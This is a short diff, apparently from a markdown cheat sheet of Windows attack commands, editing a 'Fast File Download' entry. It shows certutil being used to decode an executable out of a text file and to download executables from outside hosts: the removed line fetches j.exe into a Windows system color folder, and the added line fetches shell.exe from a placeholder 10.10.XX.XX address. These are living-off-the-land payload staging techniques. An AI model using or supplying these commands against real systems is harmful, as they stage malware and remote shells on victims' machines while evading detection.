@@ -397,5 +397,5 @@ certutil -decode test.txt test.exe
 ```
 # Fast File Download
 ```
-certutil --urlcache -f http://my.com c:\windows\system32\spool\drivers\color\j.exe
+certutil -f -split -urlcache http://10.10.XX.XX/shell.exe
 ```
